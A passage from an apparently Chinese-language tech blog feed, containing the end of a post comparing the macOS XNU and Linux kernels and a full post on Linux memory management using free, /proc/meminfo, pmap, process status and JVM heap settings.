<h2 id="macOS-Kernel-特色"><a href="#macOS-Kernel-特色" class="headerlink" title="macOS Kernel 特色"></a>macOS Kernel 特色</h2><p>macOS kernel 的特色官方总结为: XNU。意思是 “XNU 不是 Unix”。根据苹果的 Github 页面, XNU 是 “一个混合内核, 奠基于卡耐基·梅隆大学开发的 Mach kernel , 它的组件来自 FreeBSD 和用于编写驱动程序的 C++ API “。BSD 子系统部分的代码 “通常作为微核心系统中实现用户空间服务”。Mach 部分的代码则负责较底层的工作, 例如多任务（multitasking）、内存保护（ protected memory）、虚拟内存管理（virtual memory management）、支持内核调试（kernel debugging）和控制台 I/O 。 Mach 的虚拟内存（VM）系统也被 BSD 的开发者用于 CSRG ，并出现在 BSD 派生的系统中，如 FreeBSD ，但是无论 macOS 还是 FreeBSD 都并未保留 Mach 首倡的微核心结构，除了 macOS 继续提供微核心于内部处理通信以及应用程序直接控制之外。</p>
<blockquote>
<p>他在旧版的SketchPad代码基础上进行了修改，让它运行在Macintosh上，并改名MacSketch。SketchPad通过菜单的方式选取图案和样式，Bill把它们放到屏幕下方，变成固定的调色板，并在屏幕左边另外增加一组调色板，包含了各种各样的绘图工具。后续还会不断增加新的工具，不过MacPaint早期的基本架构已经就此成形。<br>———《硅谷革命：成就苹果公司的疯狂往事》</p>
</blockquote>
<h2 id="Linux-Kernel-特色"><a href="#Linux-Kernel-特色" class="headerlink" title="Linux Kernel 特色"></a>Linux Kernel 特色</h2><p>如果说 macOS 内核的特点是结合了微核心 (microkernel ，Mach) 和宏内核 (monolithic kernel ，BSD)，那么 Linux 则仅仅是一个宏内核。宏内核负责管理 CPU、内存、进程间通信、设备驱动程序、文件系统和系统服务调用。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OS_Kernel_Model.png" alt=""></p>
<h2 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h2><p>macOS 内核代码 (XNU) 基于两个甚至包含古老代码基的组合。另一方面, Linux 的历史更短, 它从头开始编写并且应用广泛。</p>
<blockquote>
<p>预测未来的最佳方式就是创造未来。<br>——  个人电脑之父 艾伦·凯(Alan Kay)</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum info google-chrome-stable</span></span><br><span class="line">google-chrome                                                                                                 | 1.3 kB     00:00     </span><br><span class="line">google-chrome/primary                                                                                         | 1.7 kB     00:00     </span><br><span class="line">google-chrome                                                                                                                                            3/3</span><br><span class="line">可安装的软件包</span><br><span class="line">Name        : google-chrome-stable</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 71.0.3578.98</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 54 M</span><br><span class="line">Repo        : google-chrome</span><br><span class="line">Summary     : Google Chrome</span><br><span class="line">URL         : https://chrome.google.com/</span><br><span class="line">License     : Multiple, see https://chrome.google.com/</span><br><span class="line">Description : The web browser from Google</span><br><span class="line">            :</span><br><span class="line">            : Google Chrome is a browser that combines a minimal design with sophisticated technology to make the web faster, safer, and easier.</span><br><span class="line"></span><br><span class="line"><span class="comment"># yum install google-chrome-stable</span></span><br><span class="line">设置安装进程</span><br><span class="line">解决依赖关系</span><br><span class="line">--&gt; 执行事务检查</span><br><span class="line">---&gt; Package google-chrome-stable.x86_64 0:71.0.3578.98-1 will be 安装</span><br><span class="line">--&gt; 处理依赖关系 libnss3.so(NSS_3.22)(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 libc.so.6(GLIBC_2.16)(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 liberation-fonts，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 libssl3.so(NSS_3.28)(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 libgtk-3.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 libappindicator3.so.1()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 libatspi.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 libgdk-3.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 处理依赖关系 libatk-bridge-2.0.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要</span><br><span class="line">--&gt; 完成依赖关系计算</span><br><span class="line"> You could try using --skip-broken to work around the problem</span><br><span class="line"> You could try running: rpm -Va --nofiles --nodigest</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：启动</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：空间管理</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：内存管理</a></li>
<li><a href="https://riboseyim.github.io/2018/01/08/Linux-Works-Network/">操作系统原理 | How Linux Works（四）：网络管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://itsfoss.com/mac-linux-difference/">Difference Between the macOS and Linux Kernels</a></li>
<li><a href="http://osxbook.com/book/bonus/ancient/whatismacosx/arch_xnu.html">What is Mac OS X?</a></li>
<li><a href="https://www.linkedin.com/in/orestzborowski/">Linkedin:Orest Zborowski</a></li>
<li><a href="https://en.wikibooks.org/wiki/Linux_Networking/A_brief_history_of_Linux_Networking_Kernel_Development">Linux Networking/A brief history of Linux Networking Kernel Development</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works:Memory</title>
    <url>/2017/12/11/Linux-Works-Memory/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>经典内存异常：Out of Memory (OOM) Killer</li>
<li>我的内存利用率为什么特别高？</li>
<li>Linux 内存的分类</li>
<li>Linux 内存的计算</li>
<li>Linux 进程的内存</li>
<li>Linux 应用内存分配</li>
</ul>
<span id="more"></span>
<p>内存是计算机中与CPU进行沟通的桥梁，用于暂时存放CPU中的运算数据。Linux 内核的内存管理机制设计得非常精妙，对于 Linux 内核的性能有很大影响。在早期的 Unix 系统中，fork 启动新进程时，由于从父进程往子进程复制内存信息需要消耗一定的时间，因此启动多个进程时存在性能瓶颈。现在的 Linux 内核则通过“写时复制（copy-on-write）”等机制提高了创建进程的效率；也正是因为这个原因，关于 Linux 内存分配、计算、空闲判断有一些特别的地方需要注意。</p>
<h4 id="内存异常：-Out-of-Memory-OOM-Killer"><a href="#内存异常：-Out-of-Memory-OOM-Killer" class="headerlink" title="内存异常： Out of Memory (OOM) Killer"></a>内存异常： Out of Memory (OOM) Killer</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ dmesg | tail</span><br><span class="line">[<span class="number">1880957.563400</span>] Out of memory: Kill process <span class="number">18694</span> (perl) score <span class="number">246</span> <span class="keyword">or</span> sacrifice child</span><br></pre></td></tr></table></figure>
<p>最常见的内存管理异常就是 Out of memory 问题。通常是因为某个应用程序大量请求内存导致系统内存不足造成的，触发 Linux 内核里的 <a href="https://linux-mm.org/OOM_Killer">Out of Memory (OOM) killer</a>，OOM killer 会杀掉某个进程以释放内存留给系统内核用。它实际上算一种保护机制，不致于让系统立刻崩溃，有些壮士断腕的意思。</p>
<p>内核检测到内存利用不足，就会选择并杀掉某个“bad”进程。如何判断和选择一个 “bad” 进程呢? 算法和思路其实非常朴素（简单）：最 bad 的那个进程就是那个占用内存最多的进程。内核源代码详见 linux/mm/oom_kill.c 。</p>
<h4 id="我的内存利用率为什么特别高？"><a href="#我的内存利用率为什么特别高？" class="headerlink" title="我的内存利用率为什么特别高？"></a>我的内存利用率为什么特别高？</h4><ul>
<li>内存利用率（概括）: free</li>
<li>内存利用率（进程）: top</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Perf-Memory-Normal.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">内存空闲率 = (Total - Used) / Total = (<span class="number">7982</span>M - <span class="number">7503</span>M) / <span class="number">7983</span>M X <span class="number">100</span> % = <span class="number">6</span> %</span><br><span class="line"></span><br><span class="line">“真实的” 内存空闲率 =  (<span class="built_in">free</span> + shared + buffers + cached)/ Total = <span class="number">5860</span> M / <span class="number">7983</span>M X <span class="number">100</span> % = <span class="number">73.4</span> %</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>实际情况是系统运行正常、不存在内存不足的情况，对于应用程序来说，“真实的” 内存空闲率是 73.4% 。如果要回答这个问题，必须了解内存管理的基础 —— 物理地址空间和逻辑地址空间。</p>
<p>按照用途，内存可以划分为“内核内存”和“用户内存”（用户进程及磁盘高速缓存），包括内核本身在内，程序在访问物理内存时，并不直接指定物理地址，而是指定逻辑地址。CPU 上搭载的硬件 MMU （Memory Management Unit）会参照物理-逻辑地址对应关系表实现对映射后物理地址上的数据访问。x86 架构中逻辑地址空间限制在 4GB ，在 x86_64 架构中则没有此限制。</p>
<h4 id="Linux-内存的分类"><a href="#Linux-内存的分类" class="headerlink" title="Linux 内存的分类"></a>Linux 内存的分类</h4><p>用户内存的分类有两组概念比较重要：匿名内存和File-backed内存；Active 和 Inactive 。它们的区别如下：</p>
<ul>
<li>匿名内存：用来存储用户进程<strong>计算过程中间的数据</strong>，与物理磁盘的文件没有关系；</li>
<li>File-backed内存：用作磁盘高速缓存，其物理内存与物理磁盘上的文件是对应的；</li>
<li>Active : 刚被使用过的数据的内存空间；</li>
<li>Inactive : 包含有长时间未被使用过的数据的内存空间；</li>
</ul>
<p><strong>Shmem</strong>（shared memory）指的就是 tmpfs 所使用的内存 —— 一个基于内存的文件系统，提供可以接近零延迟的快速存储区域。Linux 可以将空闲内存用于缓存，并且在应用程序需要的时候收回。<strong>“­/+ buffers/cache”</strong>: 提供了关于内存利用率更加准确的数值。<strong>buffers</strong>: buffer cache,用于块设备I/O ; <strong>cached</strong>: page cache, 用于文件系统。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># free</span></span><br><span class="line">			  total        used        <span class="built_in">free</span>      shared  buff/cache   available</span><br><span class="line">Mem:        <span class="number">1012720</span>      <span class="number">168756</span>       <span class="number">23576</span>       <span class="number">52024</span>      <span class="number">820388</span>      <span class="number">754520</span></span><br><span class="line">Swap:        <span class="number">262140</span>          <span class="number">88</span>      <span class="number">262052</span></span><br><span class="line"><span class="meta"># mkdir /mnt/ramdisk</span></span><br><span class="line"><span class="meta"># mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk</span></span><br><span class="line"><span class="meta"># vi /etc/fstab</span></span><br><span class="line"><span class="meta"># tmpfs       /mnt/ramdisk tmpfs   nodev,nosuid,noexec,nodiratime,size=1024M   0 0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>内存利用率（详细）：cat /proc/meminfo</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat /proc/meminfo</span><br><span class="line">MemTotal:        <span class="number">8174352</span> kB</span><br><span class="line">MemFree:          <span class="number">376952</span> kB</span><br><span class="line">Buffers:          <span class="number">527412</span> kB</span><br><span class="line">Cached:          <span class="number">5178924</span> kB</span><br><span class="line">SwapCached:           <span class="number">60</span> kB</span><br><span class="line">Active:          <span class="number">3061760</span> kB</span><br><span class="line">Inactive:        <span class="number">4066588</span> <span class="function">kB</span></span><br><span class="line"><span class="function"><span class="title">Active</span><span class="params">(anon)</span>:    1112780 kB</span></span><br><span class="line"><span class="function"><span class="title">Inactive</span><span class="params">(anon)</span>:   314156 kB</span></span><br><span class="line"><span class="function"><span class="title">Active</span><span class="params">(file)</span>:    1948980 kB</span></span><br><span class="line"><span class="function"><span class="title">Inactive</span><span class="params">(file)</span>:  3752432 kB</span></span><br><span class="line"><span class="function">Unevictable:        6724 kB</span></span><br><span class="line"><span class="function">Mlocked:            6724 kB</span></span><br><span class="line"><span class="function">SwapTotal:      16779884 kB</span></span><br><span class="line"><span class="function">SwapFree:       16777400 kB</span></span><br><span class="line"><span class="function">Dirty:               376 kB</span></span><br><span class="line"><span class="function">Writeback:             0 kB</span></span><br><span class="line"><span class="function">AnonPages:       1428844 kB</span></span><br><span class="line"><span class="function">Mapped:            64632 kB</span></span><br><span class="line"><span class="function">Shmem:               644 kB</span></span><br><span class="line"><span class="function">Slab:             557384 kB</span></span><br><span class="line"><span class="function">SReclaimable:     338272 kB</span></span><br><span class="line"><span class="function">SUnreclaim:       219112 kB</span></span><br><span class="line"><span class="function">KernelStack:        4024 kB</span></span><br><span class="line"><span class="function">PageTables:        12440 kB</span></span><br><span class="line"><span class="function">NFS_Unstable:          0 kB</span></span><br><span class="line"><span class="function">Bounce:                0 kB</span></span><br><span class="line"><span class="function">WritebackTmp:          0 kB</span></span><br><span class="line"><span class="function">CommitLimit:    20867060 kB</span></span><br><span class="line"><span class="function">Committed_AS:    2406484 kB</span></span><br><span class="line"><span class="function">VmallocTotal:   34359738367 kB</span></span><br><span class="line"><span class="function">VmallocUsed:      111536 kB</span></span><br><span class="line"><span class="function">VmallocChunk:   34359455060 kB</span></span><br><span class="line"><span class="function">HugePages_Total:       0</span></span><br><span class="line"><span class="function">HugePages_Free:        0</span></span><br><span class="line"><span class="function">HugePages_Rsvd:        0</span></span><br><span class="line"><span class="function">HugePages_Surp:        0</span></span><br><span class="line"><span class="function">Hugepagesize:       2048 kB</span></span><br><span class="line"><span class="function">DirectMap4k:        6384 kB</span></span><br><span class="line"><span class="function">DirectMap2M:     2080768 kB</span></span><br><span class="line"><span class="function">DirectMap1G:     6291456 kB</span></span><br></pre></td></tr></table></figure>
<h4 id="Linux-内存的计算"><a href="#Linux-内存的计算" class="headerlink" title="Linux 内存的计算"></a>Linux 内存的计算</h4><p>各类内存的计算公式如下：</p>
<blockquote>
<p>Shmem = 磁盘高速缓存（buffers/cached）- Filed-backed内存（file）<br>          = 匿名内存（anon）- AnonPages<br>用户内存 = Active(file) + Inactive(file) + Active(anon) + Inactive(anon) + Unevictable<br>          = buffers + cached + AnonPages</p>
<p>内核内存 = Memtotal - (MemFree + Active + Inactive + Unevictable)</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat /proc/meminfo | grep Active</span><br><span class="line">Active:          <span class="number">3065880</span> <span class="function">kB</span></span><br><span class="line"><span class="function"><span class="title">Active</span><span class="params">(anon)</span>:    1116748 kB</span></span><br><span class="line"><span class="function"><span class="title">Active</span><span class="params">(file)</span>:    1949132 kB</span></span><br><span class="line"><span class="function">-bash-4.3$</span></span><br><span class="line"><span class="function">-bash-4.3$</span></span><br><span class="line"><span class="function">-bash-4.3$ cat /proc/meminfo | grep InActive</span></span><br><span class="line"><span class="function">-bash-4.3$</span></span><br><span class="line"><span class="function">-bash-4.3$ cat /proc/meminfo | grep Inactive</span></span><br><span class="line"><span class="function">Inactive:        4067224 kB</span></span><br><span class="line"><span class="function"><span class="title">Inactive</span><span class="params">(anon)</span>:   314156 kB</span></span><br><span class="line"><span class="function"><span class="title">Inactive</span><span class="params">(file)</span>:  3753068 kB</span></span><br><span class="line"><span class="function">-bash-4.3$</span></span><br><span class="line"><span class="function">-bash-4.3$</span></span><br><span class="line"><span class="function">-bash-4.3$ cat /proc/meminfo | grep anon</span></span><br><span class="line"><span class="function"><span class="title">Active</span><span class="params">(anon)</span>:    1120720 kB</span></span><br><span class="line"><span class="function"><span class="title">Inactive</span><span class="params">(anon)</span>:   314156 kB</span></span><br><span class="line"><span class="function">-bash-4.3$</span></span><br><span class="line"><span class="function">-bash-4.3$ cat /proc/meminfo | grep file</span></span><br><span class="line"><span class="function"><span class="title">Active</span><span class="params">(file)</span>:    1949236 kB</span></span><br><span class="line"><span class="function"><span class="title">Inactive</span><span class="params">(file)</span>:  3753096 kB</span></span><br><span class="line"><span class="function">-bash-4.3$</span></span><br></pre></td></tr></table></figure>
<h4 id="Linux-进程的内存"><a href="#Linux-进程的内存" class="headerlink" title="Linux 进程的内存"></a>Linux 进程的内存</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-bash<span class="number">-4.3</span>$ ps -e -o <span class="string">&#x27;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#x27;</span> | grep slview |  sort -nrk5</span><br><span class="line"><span class="number">30029</span> java            /slview/jdk150/jdk1<span class="number">.5</span><span class="number">.0</span>_06/  <span class="number">2.5</span> <span class="number">1337496</span> <span class="number">2678836</span> Dec07 slview <span class="number">54322</span></span><br><span class="line"><span class="number">31574</span> bash            -bash                        <span class="number">0.0</span>  <span class="number">2028</span>  <span class="number">70592</span> <span class="number">17</span>:<span class="number">08</span> slview   <span class="number">54322</span></span><br><span class="line"><span class="number">23398</span> crond           crond                        <span class="number">0.0</span>  <span class="number">1688</span> <span class="number">102180</span> <span class="number">16</span>:<span class="number">10</span> slview   <span class="number">54322</span></span><br><span class="line"> <span class="number">1123</span> crond           crond                        <span class="number">0.0</span>  <span class="number">1688</span> <span class="number">102180</span> Dec10 slview   <span class="number">54322</span></span><br><span class="line"><span class="number">28252</span> crond           crond                        <span class="number">0.0</span>  <span class="number">1596</span> <span class="number">102028</span> <span class="number">16</span>:<span class="number">45</span> slview   <span class="number">54322</span></span><br></pre></td></tr></table></figure>
<p>执行“ps aux” 后输出的各进程的 <strong>RSS</strong> (resident set size), 表示进程占用内存的大小，单位是KB。 需要注意的是，RSS 值实际上是基于 pmap 命令，表示“该进程<strong>正在使用的</strong>物理内存的总和”。pmap 提供了进程的内存映射，也可以支持多个进程的内存状态显示（pmap  pid1 pid2 pid3）。与 ldd 命令类似，pmap 命令可以查看到程序调用的路径。如果查看一个已经运行，但是又不知道程序路径的程序，使用pmap更快捷。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ pmap -x <span class="number">30029</span></span><br><span class="line"><span class="number">30029</span>:   /slview/jdk150/jdk1<span class="number">.5</span><span class="number">.0</span>_06/bin/java -com.apache.Test</span><br><span class="line">Address           Kbytes     RSS   Dirty Mode   Mapping</span><br><span class="line"><span class="number">0000000008048000</span>      <span class="number">60</span>      <span class="number">48</span>       <span class="number">0</span> r-x--  java</span><br><span class="line"><span class="number">0000000008057000</span>       <span class="number">8</span>       <span class="number">8</span>       <span class="number">8</span> rwx--  java</span><br><span class="line"><span class="number">0000000009f</span>1d000   <span class="number">23184</span>   <span class="number">23140</span>   <span class="number">23140</span> rwx--    [ anon ]</span><br><span class="line"><span class="number">000000004</span>d1f1000     <span class="number">108</span>      <span class="number">96</span>       <span class="number">0</span> r-x--  ld<span class="number">-2.5</span>.so</span><br><span class="line"><span class="number">000000004</span>d20c000       <span class="number">4</span>       <span class="number">4</span>       <span class="number">4</span> r-x--  ld<span class="number">-2.5</span>.so</span><br><span class="line"><span class="number">000000004</span>d20d000       <span class="number">4</span>       <span class="number">4</span>       <span class="number">4</span> rwx--  ld<span class="number">-2.5</span>.so</span><br><span class="line"><span class="number">000000004</span>d214000    <span class="number">1356</span>     <span class="number">548</span>       <span class="number">0</span> r-x--  libc<span class="number">-2.5</span>.so</span><br><span class="line"><span class="number">000000004</span>d367000       <span class="number">8</span>       <span class="number">8</span>       <span class="number">8</span> r-x--  libc<span class="number">-2.5</span>.so</span><br><span class="line"><span class="number">00007f</span>581e51d000      <span class="number">16</span>      <span class="number">16</span>       <span class="number">0</span> r--s-  huanan-product<span class="number">-2.6</span><span class="number">.1</span>-snapshots.jar</span><br><span class="line"><span class="number">00007f</span>581e521000      <span class="number">24</span>      <span class="number">24</span>       <span class="number">0</span> r--s-  dt.jar</span><br><span class="line"><span class="number">00007f</span>581e527000      <span class="number">36</span>      <span class="number">36</span>       <span class="number">0</span> r--s-  gnome-java-bridge.jar</span><br><span class="line"><span class="number">00007f</span>581e530000      <span class="number">32</span>      <span class="number">32</span>       <span class="number">8</span> rw-s-  <span class="number">13228</span></span><br><span class="line"><span class="number">00007f</span>581e538000       <span class="number">4</span>       <span class="number">4</span>       <span class="number">4</span> rw---    [ anon ]</span><br><span class="line"><span class="number">00007f</span>581e539000       <span class="number">4</span>       <span class="number">4</span>       <span class="number">0</span> r----    [ anon ]</span><br><span class="line"><span class="number">00007f</span>581e53a000       <span class="number">8</span>       <span class="number">8</span>       <span class="number">8</span> rw---    [ anon ]</span><br><span class="line"><span class="number">00007f</span>ffe9eb7000      <span class="number">84</span>      <span class="number">32</span>      <span class="number">32</span> rw---    [ <span class="built_in">stack</span> ]</span><br><span class="line"><span class="number">00007f</span>ffe9fff000       <span class="number">4</span>       <span class="number">4</span>       <span class="number">0</span> r-x--    [ anon ]</span><br><span class="line">ffffffffff600000       <span class="number">4</span>       <span class="number">0</span>       <span class="number">0</span> r-x--    [ anon ]</span><br><span class="line">(部分省略)</span><br><span class="line">----------------  ------  ------  ------</span><br><span class="line">total kB         <span class="number">2484196</span>   <span class="number">36180</span>   <span class="number">26880</span></span><br></pre></td></tr></table></figure>
<p><strong>/proc/PID/status</strong> 支持的选项有：</p>
<ul>
<li>VmData: data段大小</li>
<li>VmExe: text段大小</li>
<li>Vmlib: 共享库的使用量</li>
<li>VmRSS: 物理内存使用量</li>
<li>VmSwap: 交换空间的使用量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat /proc/<span class="number">30029</span>/status</span><br><span class="line">Name:	java</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	<span class="number">30029</span></span><br><span class="line">Pid:	<span class="number">30029</span></span><br><span class="line">PPid:	<span class="number">29983</span></span><br><span class="line">TracerPid:	<span class="number">0</span></span><br><span class="line">Uid:	<span class="number">54322</span>	<span class="number">54322</span>	<span class="number">54322</span>	<span class="number">54322</span></span><br><span class="line">Gid:	<span class="number">54323</span>	<span class="number">54323</span>	<span class="number">54323</span>	<span class="number">54323</span></span><br><span class="line">FDSize:	<span class="number">8192</span></span><br><span class="line">Groups:	<span class="number">10</span> <span class="number">54323</span></span><br><span class="line">VmPeak:	 <span class="number">2754032</span> kB</span><br><span class="line">VmSize:	 <span class="number">2678836</span> kB</span><br><span class="line">VmLck:	       <span class="number">0</span> kB</span><br><span class="line">VmHWM:	 <span class="number">1337912</span> kB</span><br><span class="line">VmRSS:	 <span class="number">1337512</span> kB</span><br><span class="line">VmData:	 <span class="number">2575692</span> kB</span><br><span class="line">VmStk:	    <span class="number">1012</span> kB</span><br><span class="line">VmExe:	      <span class="number">60</span> kB</span><br><span class="line">VmLib:	  <span class="number">101564</span> kB</span><br><span class="line">VmPTE:	    <span class="number">3048</span> kB</span><br><span class="line">Threads:	<span class="number">98</span></span><br><span class="line">SigQ:	<span class="number">0</span>/<span class="number">63825</span></span><br><span class="line">SigPnd:	<span class="number">0000000000000000</span></span><br><span class="line">ShdPnd:	<span class="number">0000000000000000</span></span><br><span class="line">SigBlk:	<span class="number">0000000000000004</span></span><br><span class="line">SigIgn:	<span class="number">0000000000000001</span></span><br><span class="line">SigCgt:	<span class="number">1000000180005</span>cce</span><br><span class="line">CapInh:	<span class="number">0000000000000000</span></span><br><span class="line">CapPrm:	<span class="number">0000000000000000</span></span><br><span class="line">CapEff:	<span class="number">0000000000000000</span></span><br><span class="line">CapBnd:	ffffffffffffffff</span><br><span class="line">Cpus_allowed:	ffffffff</span><br><span class="line">Cpus_allowed_list:	<span class="number">0</span><span class="number">-31</span></span><br><span class="line">Mems_allowed:	<span class="number">00000000</span>,</span><br><span class="line">Mems_allowed_list:	<span class="number">0</span></span><br><span class="line">voluntary_ctxt_switches:	<span class="number">12468</span></span><br><span class="line">nonvoluntary_ctxt_switches:	<span class="number">19</span></span><br></pre></td></tr></table></figure>
<h4 id="Linux-应用内存分配"><a href="#Linux-应用内存分配" class="headerlink" title="Linux 应用内存分配"></a>Linux 应用内存分配</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Memory-Application.png" alt=""></p>
<p>类似 Java 之类的虚拟机应用程序可以设置内存参数，例如:<br>Xms128m JVM初始分配的堆内存<br>Xmx512m JVM最大允许分配的堆内存<br>XX:PermSize=64M JVM初始分配的非堆内存<br>XX:MaxPermSize=128M JVM最大允许分配的非堆内存</p>
<p>如果该应用需要较大的内存空间，可以调整为 -Xmx1024m、-Xmx2048m 以保障应用程序的运行性能，XX:MaxPermSize 设置过小会导致内存溢出，java.lang.OutOfMemoryError: PermGen space。但是 <strong>需要特别注意</strong> 的是：Xmx 绝对不能超过最大物理内存，或者说需要保留一定的剩余内存空间，否则将有可能导致其它进程因为没有可用内存而阻塞，甚至无法登陆机器 。</p>
<p>正如摔跤游戏一样，内存管理的法则就是让进程在 <strong>留有余地</strong> 的前提下搏杀。</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="https://manybutfinite.com/post/how-the-kernel-manages-your-memory/">How The Kernel Manages Your Memory</a></li>
<li><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/">Anatomy of a Program in Memory</a></li>
<li><a href="https://manybutfinite.com/post/getting-physical-with-memory/">Getting Physical With Memory</a></li>
<li><a href="https://povilasv.me/go-memory-management/">Go Memory Management</a></li>
</ul>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="性能诊断指南"><a href="#性能诊断指南" class="headerlink" title="性能诊断指南"></a>性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
